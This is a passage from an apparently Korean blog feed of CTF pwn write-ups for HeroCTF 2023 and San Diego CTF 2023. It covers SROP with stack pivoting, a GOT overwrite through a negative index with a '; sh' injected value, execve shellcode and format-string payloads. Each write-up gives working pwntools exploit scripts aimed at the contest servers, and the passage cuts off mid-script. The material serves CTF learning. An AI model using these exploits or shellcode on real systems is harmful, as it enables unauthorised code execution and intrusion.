class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">sys_read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">sys_read(<span class="number">0</span>, motivation_letter, <span class="number">0x1F4</span>uLL);</span><br></pre></td></tr></table></figure><p>Ï≤òÏùåÏóê <code>buf</code>Ïóê ÏûÖÎ†•ÏùÑ Î∞õÍ≥† Ï†ÑÏó≠ Î≥ÄÏàòÏù∏ <code>motivation_letter</code> ÏóêÎèÑ Îß§Ïö∞ ÎÑâÎÑâÌïòÍ≤å ÏûÖÎ†•ÏùÑ Î∞õÎäîÎã§. Î≥¥Ìò∏Í∏∞Î≤ïÏù¥ ÏïÑÎ¨¥Í≤ÉÎèÑ Í±∏Î†§ÏûàÏßÄ ÏïäÍ∏∞ ÎïåÎ¨∏Ïóê Îã®ÏàúÌïòÍ≤å ÏÉùÍ∞ÅÌï¥ÏïºÌïúÎã§.</p><p><code>pie</code>Í∞Ä Í±∏Î†§ÏûàÏßÄ ÏïäÏïÑÏÑú Ï†ÑÏó≠ Î≥ÄÏàò Ï£ºÏÜåÎ•º Î∞îÎ°ú Ïïå Ïàò ÏûàÍ≥†, Í∞íÏùÑ Ï†ÅÏùÄ Í≥≥Ïùò Ï£ºÏÜåÎ•º Í≥ÑÏÇ∞Ìï† Ïàò ÏûàÎã§. (Ïò§ÌîÑÏÖãÏùÑ Í≥ÑÏÇ∞Ìï† Ïàò ÏûàÎã§.)</p><p>Ï≤òÏùåÏóê <code>buf</code>Ïóê ÏûÖÎ†•ÏùÑ Î∞õÏùÑ Îïå Î™ÖÎ∞±Ìïú <code>bof</code>Í∞Ä Î∞úÏÉùÌïúÎã§. ÌïòÏßÄÎßå Í∏∏Ïù¥Í∞Ä ÏßßÍ∏∞ ÎïåÎ¨∏Ïóê Ïñ¥ÎîòÍ∞ÄÏóê <code>payload</code>Î•º Ï†ÄÏû•ÌïòÍ≥† Í∑∏ Í≥≥ÏúºÎ°ú Îõ∏ ÏÉùÍ∞ÅÏùÑ 1Ï∞®Ï†ÅÏúºÎ°ú Ìï¥ÏïºÌïúÎã§.</p><p><code>motivation_letter</code>Ïóê ÏûÖÎ†•Î∞õÎäî ÏÇ¨Ïù¥Ï¶àÍ∞Ä ÌÅ¨Í∏∞ ÎïåÎ¨∏Ïóê Ï†ÅÏ†àÌï¥Î≥¥ÏòÄÎã§. Ïó¨Í∏∞Ïóê <code>rop_payload</code>Î•º Ï†ÄÏû•ÌïòÍ≥† Îõ∞Ïñ¥ÏïºÍ≤†Îã§. Í∑∏Î¶¨Í≥† <code>execve</code> Ìï®Ïàò Ïù∏Ïûê <code>/bin/sh</code>Î•º Ï†ÄÏû•Ìï¥ÏïºÍ≤†Îã§.</p><p><code>sigreturn rop</code>Î•º Ìï† Îïå Í∞ÄÏû• Ï£ºÏùòÌï¥Ïïº Ìï† Ï†êÏùÄ <code>rax</code> Î†àÏßÄÏä§ÌÑ∞Ïùò ÌÅ¨Í∏∞Î•º ÏûäÏßÄ ÏïäÍ≥† <code>0xf</code>Î°ú ÎßûÏ∂∞Ï£ºÍ≥† <code>syscall ; ret</code>Î•º Ïã§ÌñâÌï¥ÏïºÌïúÎã§Îäî Í≤ÉÏù¥Îã§.</p><p><code>stack pivoting</code>Ìï† Îïå Í∞ÄÏ†Ø Îç©Ïñ¥Î¶¨Îì§ Î≥¥Î©¥ÏÑú Îã®ÏàúÌïòÍ≤å <code>leave ; ret</code>Ïù¥ ÏïàÎ≥¥Ïó¨ÏÑú ÎãπÌô©Ìï† ÏàòÎèÑ ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401114                 mov     rsp, rbp</span><br><span class="line">.text:0000000000401117                 pop     rbp</span><br><span class="line">.text:0000000000401118                 retn</span><br></pre></td></tr></table></figure><p>Ïù¥ Î¨∏Ï†úÎäî Ïñ¥ÏÖàÎ∏îÎ¶¨Î°ú Ïì∞Ïó¨Ï°åÍ∏∞ ÎïåÎ¨∏Ïóê ÏúÑ Ïñ¥ÏÖàÎ∏îÎ¶¨Í∞Ä <code>leave ; ret</code>ÏûÑÏùÑ ÎààÏπòÏ±ÑÏïº ÌïúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>stack pivoting ÌïòÎäî Î≤ï</p><ol><li>rbpÎ•º jumpÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜå -8Î°ú ÏÑ∏ÌåÖ (rop Í∞ÄÏ†ØÏù¥ ÏûàÎäî Í≥≥ - 8)</li><li>retÎ•º leave_retÏ£ºÏÜåÎ°ú Î≥ÄÍ≤Ω</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./ropedancer&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ropedancer&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5002</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;?&#x27;</span>, p32(<span class="number">0xA736579</span>))</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x000000000040102f</span></span><br><span class="line">motivation_letter = <span class="number">0x40312C</span></span><br><span class="line">xor_rax_inc_rax = <span class="number">0x0000000000401011</span></span><br><span class="line">inc_rax = <span class="number">0x401013</span></span><br><span class="line">leave_ret = <span class="number">0x401114</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = motivation_letter+<span class="number">0x178</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>)</span><br><span class="line">payload += p64(motivation_letter - <span class="number">8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. rbpÎ•º jumpÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜå -8Î°ú ÏÑ∏ÌåÖ (rop Í∞ÄÏ†ØÏù¥ ÏûàÎäî Í≥≥ - 8)</span></span><br><span class="line"><span class="comment"># 2. retÎ•º leave_retÏ£ºÏÜåÎ°ú Î≥ÄÍ≤Ω</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">stack_pivot = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">stack_pivot += p64(xor_rax_inc_rax) <span class="comment"># 1</span></span><br><span class="line">stack_pivot += p64(inc_rax) * <span class="number">14</span></span><br><span class="line"></span><br><span class="line">stack_pivot += p64(syscall)</span><br><span class="line">stack_pivot += <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(stack_pivot)))</span><br><span class="line">stack_pivot += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, stack_pivot)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack pivoting </tag>
            
            <tag> srop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hero CTF 2023 - Appointment Book (*addr = value)</title>
      <link href="/230518-heroctf2023-appointment-book/"/>
      <url>/230518-heroctf2023-appointment-book/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1951">https://ctftime.org/event/1951</a></li></ul><blockquote><p>Exploit this application to get the flag!<br>Host : nc static-03.heroctf.fr 5000<br>Format : Hero{flag}<br>Author : SoEasY<br>easy</p></blockquote><ul><li>[68 solves &#x2F; 298 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;========== Welcome to your appointment book. ==========&quot;</span>);</span><br><span class="line">  v5 = time(<span class="number">0LL</span>);</span><br><span class="line">  local_time = timestamp_to_date(v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[LOCAL TIME] %s\n&quot;</span>, local_time);</span><br></pre></td></tr></table></figure><p>Ï≤òÏùåÏóê main Ìï®ÏàòÏóêÏÑú <code>local_time</code>ÏùÑ Ï∂úÎ†•Ìï¥Ï§ÄÎã§. Ïôú Ï∂úÎ†•Ìï¥Ï£ºÎäîÏßÄ ÏÉùÍ∞ÅÏùÑ Íº≠ Ìï¥ÏïºÌïúÎã§. Ï∂úÎ†•Ìï¥ Ï§Ä Îã§Ïùå Ïó¨Îü¨ Î©îÎâ¥Îì§Ïù¥ ÏûàÎäîÎç∞ <code>create_appointment</code> Î©îÎâ¥Îßå Î≥¥Î©¥ ÎêúÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_appointment</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 value; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 *addr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter the index of this appointment (0-7): &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx); <span class="comment">// oob</span></span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( idx &gt; <span class="number">7</span> );</span><br><span class="line">  addr = (&amp;appointments + <span class="number">16</span> * idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter a date and time (YYYY-MM-DD HH:MM:SS): &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">30</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  value = date_to_timestamp(s);</span><br><span class="line">  *addr = value; <span class="comment">// ÏõêÌïòÎäî Ï£ºÏÜåÏóê ÏõêÌïòÎäî Í∞í Ïì∞Í∏∞ Í∞ÄÎä•</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Converted to UNIX timestamp using local timezone: %ld\n&quot;</span>, *addr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Enter an associated message (place, people, notes...): &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(v4, <span class="number">62</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  addr[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>idx</code>Í∞Ä <code>int</code> ÏûêÎ£åÌòïÏùÑ Í∞ÄÏßÄÍ≥† ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê <code>oob</code>Í∞Ä Î∞úÏÉùÌïúÎã§. Ïù¥ Ïù∏Îç±Ïä§Î•º Í∞ÄÏßÄÍ≥† <code>addr</code> Î≥ÄÏàò ÏúÑÎ°ú Ï†ëÍ∑ºÌï† Ïàò ÏûàÎã§. ÏúÑÏóêÎäî <code>got</code>Îì§Ïù¥ ÏûêÎ¶¨Ïû°Í≥† ÏûàÎäîÎç∞ ÏõêÌïòÎäî Í≥≥Ïóê Ï†ëÍ∑ºÌï¥ÏÑú ÏõêÌïòÎäî Í∞íÏùÑ Ïì∏ Ïàò ÏûàÎã§. <code>system(&quot;/bin/sh&quot;)</code>Î•º Ìò∏Ï∂úÌïòÎäî Ìï®ÏàòÎ•º Ï†ïÏùòÌï¥ÎÜ®Í∏∞ ÎïåÎ¨∏Ïóê Ïù¥ Ìï®Ïàò Ï£ºÏÜåÎ•º Ïì∞Î©¥ Îê† ÎìØ ÌïòÎã§.</p><p>Ïù¥Îïå Ï£ºÏùòÌï¥ÏïºÌï† Ï†êÏù¥ Ïì∞Í≥† Ïã∂ÏùÄ Ï£ºÏÜå Í∞íÏùÑ <code>YYYY-MM-DD HH:MM:SS</code> ÌòïÏãùÏúºÎ°ú ÎßåÎì§Ïñ¥ÏÑú ÏûÖÎ†•Ìï¥Ïïº <code>date_to_timestamp</code> Ìï®ÏàòÎ•º Í±∞Ï≥ê Ï†ïÏÉÅÏ†ÅÏù∏ Ï£ºÏÜå Í∞íÏùÑ Ïì∏ Ïàò ÏûàÍ≤å ÎêúÎã§. Í∑∏ÎûòÏÑú idaÏóêÏÑú <code>date_to_timestamp</code> Ìï®Ïàò Íµ¨ÌòÑÏùÑ Î≥¥Í≥† cÎ°ú Ïû¨ÏûëÏÑ±ÌïòÏòÄÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// timestamp_to_date</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>;</span></span><br><span class="line"><span class="type">time_t</span> timer;</span><br><span class="line"><span class="type">char</span>* s;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    timer = atoll(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// scanf(&quot;%ld&quot;, &amp;timer);</span></span><br><span class="line">    s = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    tp = localtime(&amp;timer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !tp )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Error converting the UNIX timestamp to a date and time&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    strftime(s, <span class="number">0x20</span>uLL, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, tp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Î¨∏Ï†úÏóêÏÑú Ï†ïÏùòÌï¥Ï§Ä ÏãúÏä§ÌÖú Ìï®ÏàòÎ•º ÏÇ¨Ïö©Ìï¥ÎèÑ ÎêòÏßÄÎßå Ïù¥Í≤å ÏóÜÎçîÎùºÎèÑ ÏùµÏä§Ìï† Ïàò ÏûàÎã§. <code>free</code>Ïùò <code>got</code>Î•º <code>system</code>ÏúºÎ°ú ÎçÆÍ≥† command injectionÏùÑ Ïù¥Ïö©Ìï¥ÏÑú ÏõêÌïòÎäî Í∞íÏùÑ ÎÑ£ÏùÑ Îïå <code>; sh</code>ÎèÑ Ìï®Íªò ÎÑ£Ïñ¥Ï£ºÏóàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>Ï≤òÏùåÏóê Î°úÏª¨ÏóêÏÑúÎäî Ïûò ÎêòÏóàÎäîÎç∞ Î¶¨Î™®Ìä∏Îäî Ï£ΩÏñ¥ÎèÑ ÎêòÏßà ÏïäÏïòÎã§. Í∑∏ Ïù¥Ïú†Îäî Î°úÏª¨Í≥º Î¶¨Î™®Ìä∏Ïùò <code>local_time</code>Ïù¥ Îã§Î•¥Í∏∞ ÎïåÎ¨∏Ïù¥Îã§. Î¨∏Ï†ú Ï¥àÎ∞òÏóê Ï∂úÎ†•ÏùÑ Ìï¥Ï£ºÎØÄÎ°ú ÌÉÄÏûÑÏ°¥ÏùÑ ÏïåÏïÑÎÇ¥ÏÑú <code>TZ</code> ÌôòÍ≤ΩÎ≥ÄÏàòÎ•º ÏïÑÎûòÏ≤òÎüº Î∞îÍøîÏ£ºÏóàÎã§.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TZ=IS</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./appointment_book&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./appointment_book&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># export TZ=IS</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;-13&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timestr = subprocess.check_output([<span class="string">&#x27;./timestamp_to_date&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x401180</span>)]).strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(timestr))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, timestr + <span class="string">b&#x27; ; sh&#x27;</span>)</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;:&#x27;, &#x27;1970-02-18 15:27:02&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hero&#123;Unch3ck3d_n3g4t1v3_1nd3x_1nt0_G0T_0v3wr1t3_g03s_brrrrrr&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Hero </category>
          
      </categories>
      
      
        <tags>
            
            <tag> command injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>San Diego CTF 2023 Write ups</title>
      <link href="/230515-sandiegoctf2023-PWN/"/>
      <url>/230515-sandiegoctf2023-PWN/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1910">https://ctftime.org/event/1910</a></li></ul><p>1Ï£ºÏùº Îí§ÏóêÎÇò ÏûëÏÑ±ÌïòÎäî Write ups.. Ìïú Î¨∏Ï†ú ÎπºÍ≥† Îã§ ÌíÄÏóàÎäîÎç∞ Î™ª Ìëº Î¨∏Ï†úÎäî ÎÑàÎ¨¥ Í∑πÏïÖÏùò fsbÏòÄÎã§. ÎÇòÎ®∏ÏßÄ Î¨∏Ï†úÎäî ÏâΩÍ≤å ÌíÄÏù¥ÌñàÎçò Í±∏Î°ú Í∏∞Ïñµ. </p><h2 id="Turtle-Shell"><a href="#Turtle-Shell" class="headerlink" title="Turtle Shell"></a>Turtle Shell</h2><blockquote><p>A turtle without it‚Äôs shell is a sad sight to see<br>Connect via:¬†<code>nc turtle.sdc.tf 1337</code><br>Dockerfile¬†turtle-shell</p></blockquote><ul><li>[111 solves &#x2F; 100 points]</li></ul><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./turtle-shell&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;turtle.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./turtle-shell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;w0w_y0u_m4d3_7h3_7urT13_c0m3_0u7_0f_1t5_5h3l1&#125;</span></span><br></pre></td></tr></table></figure><h2 id="money-printer"><a href="#money-printer" class="headerlink" title="money-printer"></a>money-printer</h2><blockquote><p>The first step to getting rich is printing money<br>Connect via:¬†<code>nc money.sdc.tf 1337</code><br>Dockerfile¬†money-printer</p></blockquote><ul><li>[140 solves &#x2F; 150 points]</li></ul><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./money-printerp&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;money.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./money-printerp&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. exit@got -&gt; main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;exit&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>] &#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span 